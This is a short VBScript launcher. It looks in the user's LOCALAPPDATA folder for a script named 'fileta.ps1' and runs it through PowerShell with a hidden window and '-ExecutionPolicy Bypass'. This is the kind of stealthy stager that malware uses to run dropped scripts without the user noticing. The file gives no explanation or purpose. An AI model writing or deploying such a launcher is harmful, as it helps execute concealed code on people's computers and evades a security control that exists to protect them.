Set objShell = CreateObject("WScript.Shell")
localPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
scripts = Array("fileta.ps1")

Set fso = CreateObject("Scripting.FileSystemObject")

For Each script In scripts
    scriptPath = localPath & "\" & script
    If fso.FileExists(scriptPath) Then
        objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & scriptPath & """", 0, False
    End If
Next
